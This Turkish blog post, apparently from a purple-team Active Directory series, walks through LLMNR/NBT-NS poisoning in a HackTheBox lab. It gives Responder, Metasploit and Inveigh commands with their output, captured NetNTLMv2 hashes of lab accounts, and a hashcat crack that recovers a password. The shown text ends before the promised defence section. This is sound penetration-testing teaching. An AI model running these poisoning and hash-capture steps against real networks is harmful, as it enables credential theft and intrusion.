---
title: "Active Directory LLMNR/NBT-NS Poisoning - Purple Mode"
author: b1lal
categories: [Purple, Active Directory]
tags: [active directory, llmnr, nbtns, poisoning, attack, security, pentesting, red team, ad, kerberos, active directory, hashcat, responder, inveight, naxious, metasploit]
render_with_liquid: false
description: "Bu yazıda Active Directory ortamlarında gerçekleştirilen LLMNR/NBT-NS Poisoning saldırısını, nasıl yapıldığını ve bu saldırıya karşı nasıl korunabileceğimizi anlatacağım."
media_subpath: /images/ad-llmnr-nbtns-poisoning/
layout: post
published: true  
lang: "tr"
image:
  path: main.png
  alt: "Active Directory LLMNR/NBT-NS Poisoning Attack"
---

Active Directory purple serimizin ikinci bölümünde `LLMNR / NBT-NS Poisoning` saldırısını ele alacağız. Nedir, Nasıl yapılır, Nasıl tespit edilir? gibi sorulara cevap vermeye çalışacağım.

Tabiki bu sorulara cevap vermeden önce LLMNR ve NBT-NS protokolleri nedir bunları anlamamız gerekiyor.

## **LLMNR ve NBT-NS Nedir?**

NBT-NS yerel ağdaki bilgisayarların birbirlerini isimleri üzerinden bulmasına yarayan eski bir Windows protokolüdür. Günümüzde geriye dönük uyumluluk için Windows sistemlerinde hala aktif olarak çalışabilmektedir. 

LLMNR, NBT-NS’ye benzer şekilde çalışan ancak daha modern bir isim çözümleme protokolüdür. DNS sorguları başarısız olduğunda, yerel ağda isim çözümleme yapılmasını sağlar.

Her iki protokol de ağdaki cihazların birbirlerini isimleri üzerinden bulmalarına yardımcı olur, ancak kimlik doğrulama mekanizmaları zayıf olduğu için güvenlik açısından çeşitli saldırılara açıktır.

Bir makine bir ana bilgisayarı çözümlemeye çalışır ancak DNS çözümlemesi başarısız olursa, tipik olarak makine, yerel ağdaki diğer tüm makinelere doğru ana bilgisayar adresini LLMNR aracılığıyla sormaya çalışır. LLMNR, DNS formatına dayanır ve aynı yerel bağlantıdaki ana bilgisayarların diğer ana bilgisayarlar için ad çözümlemesi yapmasına olanak tanır. Yerel olarak UDP üzerinden **5355** portunu kullanır. LLMNR başarısız olursa, NBT-NS kullanılır. NBT-NS, yerel bir ağdaki sistemleri NetBIOS adlarına göre tanımlar. NBT-NS, UDP üzerinden **137** portunu kullanır.

---

## **LLMNR Poisoning Saldırısı Nedir?**

Buradaki kritik nokta LLMNR/NBT-NS kullanıldığında, ağdaki herhangi bir bilgisayar bu isteklere cevap verebilir. İşte bu yüzden **Responder** aracı devreye girer ve bu istekleri zehirlemek için kullanılır. Sanki doğru sunucuymuş gibi davranarak, kurban bilgisayarın bizim sistemimizle iletişim kurmasını sağlar.

Eğer bu sırada kimlik doğrulama yapılırsa, kullanıcının şifresinin NetNTLM hash değeri yakalanabilir. Bu hash daha sonra kırılmaya çalışılarak gerçek parola değeri elde edilebilir. Bu elde edilen kimlik bilgileri, ağdaki diğer sistemlere de erişmek için kullanılabilir.


Şimdi bu sürecin nasıl gerçekleştiğine adım adım bakalım:



- Bir ana bilgisayar `\\print01.marvel.local` adresindeki yazdırma sunucusuna bağlanmaya çalışır, ancak yanlışlıkla `\\printer01.marvel.local` yazar.
- Yanlış yazıldığın için DNS çözümlemesi başarısız olur.
- Ardından ana bilgisayar yerel ağa `\\printer01.marvel.local` adresini bilen var mı diye broadcast yapar.
- Saldırgan, ana bilgisayara, aradığı `\\printer01.marvel.local` olduğunu belirterek cevap gönderir.
- Ana bilgisayar bu yanıta güvenerek saldırgana bir kullanıcı adı ve NTLMv2 parola hash'i içeren bir kimlik doğrulama isteği gönderir.
- Saldırgan bu hash'i yakalar ve daha sonra kırmak için kullanabilir.

![LLMNR/NBT-NS Poisoning Saldırı Akışı](flow.png)

> Daha anlaşılır olması açısından yukarıdaki görseli inceleyebilirsinz.

Ek olarak tekrar belirtmekte fayda var, bu saldırı ile amacımız ağ üzerinden gönderilen NTLMv1 ve NTLMv2 hash'lerini yakalayarak bunları çevrim dışı bir ortamda kırmak ve gerçek parola değerlerini elde etmektir. 

---

## **Linux Ortamından Saldırmak**

Linux ortamında bu saldırıyı gerçekleştirebilmek için kullandığımız en popüler araç `Responder`'dır. Saldırmaya başlamadan önce **Responder** aracından biraz bahsedelim.

**Responder**, yerel ağdaki LLMNR, NBT-NS ve MDNS isteklerini dinleyerek bu istekleri zehirlemek için kullanılan bir araçtır. Saldırgan, bu protokollere gelen istekleri yakalayarak, kurban bilgisayarın kendisiyle iletişim kurmasını sağlar. Eğer kurban bilgisayar kimlik doğrulama yaparsa, saldırgan bu kimlik bilgilerini yakalayabilir.

Responder aracını çalıştırırken sudo ayrıcalıklarıyla veya root olarak çalıştırmalı ve en iyi şekilde çalışması için saldırı ana bilgisayarımızda aşağıdaki bağlantı noktalarının kullanılabilir olduğundan emin olmalıyız:

```
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

Responder aracını aşağıdaki komutla çalıştırarak saldırıya başlayabiliriz:

```bash
sudo responder -I <INTERFACE>
```

Burada `-I` parametresi ile saldırı yapacağımız ağ arayüzünü belirtiyoruz. 

> Bu saldırının nasıl adım adım gerçekleştirildiğini hackthebox üzerinde bulunan bir lab üzerinden ele alacağız.

İlk olarak responder aracımızı aşağıdaki komutla çalıştırıyoruz.

```bash
sudo responder -I ens224
```

Sonuç:

```bash
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.7.240]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-KJ5MA313P4E]
    Responder Domain Name      [3ZA8.LOCAL]
    Responder DCE-RPC Port     [49670]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] Skipping previously captured hash for INLANEFREIGHT\AB920
[*] [MDNS] Poisoned answer sent to 172.16.7.3      for name INLANEFRIGHT.LOCAL
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[*] Skipping previously captured hash for INLANEFREIGHT\AB920
```

Çıktıdan *Skipping previously captured hash* mesajını görebiliriz. Bu mesaj, daha önce aynı ana bilgisayar ve kullanıcı adı için bir hash yakalandığını ve bu nedenle yeni bir hash yakalamaya çalışılmadığını gösterir. Bu, saldırganın aynı kullanıcıdan birden fazla hash yakalamaya çalışmasını önler ve saldırının daha etkili olmasını sağlar.

Şimdi aracımızı durdurarak önceden yakalanmış hash değerini kontrol edebiliriz.

<blockquote class="prompt-info"><p>Responder aracının varsayılan log dosyası genellikle <code><b>/usr/share/responder/logs/</b></code> dizininde bulunur. Bu dosyalarda genelleikle <b>(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt</b> formatında isimlendirilir.</p></blockquote>


Hash değerini kontrol edelim.

```bash
head -n 1 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
```

Sonuç:

```bash
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:010100000000000080807217BC4DD80128BCE65BE5F2DD84000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

Bu hash değeri, saldırganın kurban bilgisayardan yakaladığı **NTLMv2** hash'idir. Bu hash'i kırmak için **Hashcat** veya **John the Ripper** gibi popüler parola kırma araçları kullanılabilir.

Biz burada Hashcat aracını kullanacağız.

İlk olarak NTLMv2 hash'leri için kullanılan hashcat modunu bulalım:

```bash
hashcat -h | grep NTLMv2
```

Sonuç:

```bash
 5600 | NetNTLMv2                                                  | Network Protocol
27100 | NetNTLMv2 (NT)                                             | Network Protocol
```

Kullanacağımız hash modunu da bulduğumuza göre şimdi kırma işlemine geçebiliriz.

```bash
hashcat -m 5600 llmnr.hash /usr/share/wordlists/rockyou.txt.gz
```

Sonuç:

```bash
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

AB920::INLANEFREIGHT:0c6498a2a4acd121:fc356d6adc6d88df90ac4ae7c5a81948:010100000000000080807217bc4dd80128bce65be5f2dd84000000000200080036004a004500310001001e00570049004e002d00500049004d003500300048005300500046004a00530004003400570049004e002d00500049004d003500300048005300500046004a0053002e0036004a00450031002e004c004f00430041004c000300140036004a00450031002e004c004f00430041004c000500140036004a00450031002e004c004f00430041004c000700080080807217bc4dd80106000400020000000800300030000000000000000000000000200000c2ef82380450c5c35e0a85fdd7ec2c1b4d7467db93379e10636aa575b9984c570a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:0c6498a2a4acd121:fc356d6adc6d8...000000
Time.Started.....: Mon Apr  6 09:43:16 2026 (0 secs)
Time.Estimated...: Mon Apr  6 09:43:16 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1959.5 kH/s (0.82ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 290816/14344385 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 288768/14344385 (2.01%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: winers -> temyong

Started: Mon Apr  6 09:43:07 2026
Stopped: Mon Apr  6 09:43:17 2026
```

LLMNR Poisoning saldırısını gerçekleştirerek kurbanın NTLMv2 hash değerini yakaladık ve bu hash'i kendi sistemlerimizde kırarak gerçek parola değerini elde ettik.

---

### **Metasploit Framework**

Bu saldırıyı gerçekleştirmek için metasploit aracını da kullanabiliriz.

```bash
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.1.29-dev                          ]
+ -- --=[ 2199 exploits - 1164 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Start commands with a space to avoid saving 
them to history

msf6 > 
```

Modülü kullanıyoruz.

```bash
use auxiliary/spoof/llmnr/llmnr_response
```

Modülün seçeneklerine baktığımızda bizden bazı bilgileri girmemizi istediğini görüyoruz.

```bash
msf6 auxiliary(spoof/llmnr/llmnr_response) > options 

Module options (auxiliary/spoof/llmnr/llmnr_response):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   REGEX      .*               yes       Regex applied to the LLMNR Name to determine if spoofed reply is sent
   SPOOFIP                     yes       IP address with which to poison responses
   TIMEOUT    500              yes       The number of seconds to wait for new data
   TTL        30               no        Time To Live for the spoofed response


Auxiliary action:

   Name     Description
   ----     -----------
   Service  Run LLMNR spoofing service
```

Gerekli bilgileri girip run komutu ile çalıştırıyoruz.

```bash
msf6 auxiliary(spoof/llmnr/llmnr_response) >> set spoofip 172.16.5.225
spoofip => 172.16.5.225
msf6 auxiliary(spoof/llmnr/llmnr_response) >> set INTERFACE ens224
INTERFACE => ens224
auxiliary(spoof/llmnr/llmnr_response) >> run
[*] Auxiliary module running as background job 0.
[*] LLMNR Spoofer started. Listening for LLMNR requests with REGEX "(?-mix:.*)" ...
```

Poisoning başarılı olduğunda kurban sizin makinenize bağlanmaya çalışacaktır. Bu aşamada NTLM hash'lerini yakalamak için yeni bir pencerede veya arka planda şu modülü çalıştırın:

```bash
msf6 auxiliary(spoof/llmnr/llmnr_response) >> use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) >> set JOHNPWFILE /tmp/
msf6 auxiliary(server/capture/smb) >> run
```
Çalıştırdıktan sonra hem ekrana hemde belirlediğimiz yola hash değerlerinin yazıldığını görüyoruz.

```bash
...
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 172.16.5.130
[SMB] NTLMv2-SSP Username   : INLANEFREIGHT\svc_qualys
[SMB] NTLMv2-SSP Hash       : svc_qualys::INLANEFREIGHT:345e05371545e49a:6db7c2bd617d207132d034e5529a8fd3:0101000000000000000e6a98d7c5dc016ec8b131c0d26d4e000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800000e6a98d7c5dc0106000400020000000800300030000000000000000000000000300000ef0559f5c2fa686c17c7bff5bad03832760fa5d4030a925dcb381952a904817d0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000
...
```

```bash
head -n 1 hashes_netntlmv2
```

```bash
clusteragent::INLANEFREIGHT:8f638110aeee0007:e5018a9b59741dd4b1794d105f652cfc:0101000000000000802e2557d6c5dc01b844efd0d9baa221000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800802e2557d6c5dc0106000400020000000800300030000000000000000000000000300000ef0559f5c2fa686c17c7bff5bad03832760fa5d4030a925dcb381952a904817d0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000
```

Bu şekilde 2 popüler araçla Linux üzerinden **LLMNR/NBT-NS** Poisoning saldırısını gerçekleştirebildiğini gördük.

---

## **Windows Ortamından Saldırmak**

Bazen linux ortamları önümüzde hazır olmayabilir ve saldırıyı windows bir cihaz üzerinden gerçekleştirmemiz gerekebilir. Bu gibi durumlara hazırlıklı olmak adına bu kısımda windows ortamlarında bu saldırıyı nasıl yapabileceğimizi ele alalım.

Kullanacağımız araç **Inveigh**'dir. Inveigh, C# ve PowerShell ile yazılmıştır ve IPv4/IPv6 ile LLMNR, DNS, mDNS, NBNS ... gibi protokolleri dinleyebilmektedir. (Repo : <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener noreferrer">Inveigh</a>)

Repoyu klonladıktan sonra aşağıdaki şekilde import edebiliriz.

```powershell
Import-Module .\Inveigh.ps1
```

Inveigh aracının orijinal wiki sayfasından parametreleri ve ne işe yaradıklarını görebiliriz. => <a href="https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters" target="_blank" rel="noopener noreferrer">Inveigh Wiki</a>

```powershell
PS C:\Tools\AD> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata
mDNSTTL                 System.Management.Automation.ParameterMetadata
NBNSTTL                 System.Management.Automation.ParameterMetadata
NBNSBruteForcePause     System.Management.Automation.ParameterMetadata
ProxyPort               System.Management.Automation.ParameterMetadata
RunCount                System.Management.Automation.ParameterMetadata
RunTime                 System.Management.Automation.ParameterMetadata

.
.
.
```

Bizim amacımız LLMNR ve NBNS isteklerini zehirlemek olduğu için sadece bu protokollere ait parametreleri vererek saldırıyı gerçekleştirebiliriz.
Çıktıları da kayıt etmemizde fayda vardır. 

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```powershell
[*] Inveigh 1.506 started at 2026-04-25T08:44:25
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools\AD
...
```

Bir süre bekledikten sonra çıktıları kontrol edebiliriz.


```powershell
PS C:\Tools\AD> ls


    Directory: C:\Tools\AD


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/25/2026   8:46 AM         412042 Inveigh-Log.txt
-a----        4/25/2026   8:41 AM           8526 Inveigh-NTLMv2.txt
-a----        2/22/2022   1:19 PM         303194 Inveigh.ps1
```

Ek olarak bazen `CTRL + C` ile Inveigh'i durdurduğumuzda arka planda çalışmaya devam edebiliyor. Bu gibi durumlarda:

```powershell
PS C:\Tools\AD> Stop-Inveigh
[*] [2026-04-25T09:13:41] Inveigh is exiting
```

komutu ile arka planda çalışan Inveigh'i de durdurabiliriz.

Şimdi **Inveigh-NTLMv2.txt** dosyasını açarak yakalanan hash değerlerini kontrol edelim.

```powershell
PS C:\Tools\AD> type .\Inveigh-NTLMv2.txt

svc_qualys::INLANEFREIGHT:F86DE428C169A952:FAE310AA28F42A6581990175125243C0:01010000000000007C1412B1C9D4DC0126EB0FA6ECAA80E80000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008007C1412B1C9D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

clusteragent::INLANEFREIGHT:1FE16CED5A358B43:8EB887D66BD9F5E97212B0086B28B61A:010100000000000076364ECCC9D4DC0108B92B3A723C20990000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080076364ECCC9D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

...
```

Görüldüğü gibi hash değerkerini elimize geçirdik.

---

### **C#**

Şimdi de Inveigh'in güncelleme desteği alan C# sürümünü kullanarak saldırıyı gerçekleştirelim. Ama ondan önce github reposunu klonlayarak C# sürümünü derleyelim.

```powershell
git clone https://github.com/kevin-robertson/inveigh
```

```powershell
PS C:\tmp\Inveigh> dotnet --version
11.0.100-preview.3.26207.106
```

Derlemeye başlayalım.

```powershell
PS C:\tmp\Inveigh> dotnet build Inveigh.sln -c Release
Geri yükleme tamamlandı (0,6sn)
    info NETSDK1057: Bir .NET önizleme sürümü kullanıyorsunuz. Bkz. https://aka.ms/dotnet-support-policy
  Inveigh net35 başarılı(0,3sn) → Inveigh\bin\Release\net35\Inveigh.exe
  Inveigh net462 başarılı(0,3sn) → Inveigh\bin\Release\net462\Inveigh.exe
  Inveigh net10.0 başarılı(17,0sn) → Inveigh\bin\Release\net10.0\Inveigh.dll

"18,7" sn'de başarılı oluşturun
```

Şimdi derlediğimiz **Inveigh.exe** dosyasını kullanarak saldırıyı gerçekleştirebilirz.

```powershell
.\Inveigh.exe
```

```powershell
[*] Inveigh 2.0.4 [Started 2026-04-25T09:40:54 | PID 260]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::d4f5:a710:80c7:507a%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::d4f5:a710:80c7:507a%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools\AD]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console

...
```

![hash](capture-hash.png)

Çalıştırdıktan sonra Press **"ESC to enter/exit interactive console"** mesajını görüyoruz. Bir süre bekledikten sonra **ESC** tuşuna basarak interaktif konsola geçelim.

```powershell
C(0:0) NTLMv1(0:0) NTLMv2(6:103)>
```

Bu konsol üzerinde neler yapabileceğimizi görmek için **help** yazalım.

```powershell
============================================== Inveigh Console Commands ===============================================

Command                           Description
=======================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```

Yapabileceğimiz işlemleri gördükten sonra yakaladığımız hash değerlerini çekmek için **GET NTLMV2UNIQUE** komutunu kullanmamız gerektiğini görüyoruz.

```powershell
C(0:0) NTLMv1(0:0) NTLMv2(6:103)> GET NTLMV2UNIQUE
```

Sonuç:

```powershell
================================================ Unique NTLMv2 Hashes =================================================

Hashes
=======================================================================================================================
lab_adm::INLANEFREIGHT:06F09B769605E4AC:16D681C3B1C5FD0EDA444E0B1377B909:010100000000000006BB464AD2D4DC0109E91781E10FBD2E0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080006BB464AD2D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
backupagent::INLANEFREIGHT:56BEB6A79B5C2CD5:E54BF38D94AD536FFEF9CE9163EB5CA7:01010000000000001FDDF64DD2D4DC01240BF021D934A8A90000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001FDDF64DD2D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
svc_qualys::INLANEFREIGHT:3D8957A7AA9277A0:0B40C565BBA0514B5482D69685B1B2CC:0101000000000000A9D3FC51D2D4DC016C55E27C0FA4C8390000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800A9D3FC51D2D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:FA5425FAD3A4A0D1:20314F0B69441885F767BB71875B7B64:010100000000000049D6FC59D2D4DC01EC6AA4652DBDD0530000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080049D6FC59D2D4DC0106000400020000000800300030000000000000000000000000300000F13AADD54C524E45FDB9FE8D96A0128236B5497DC5F68F0F35E2AC32701375AC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
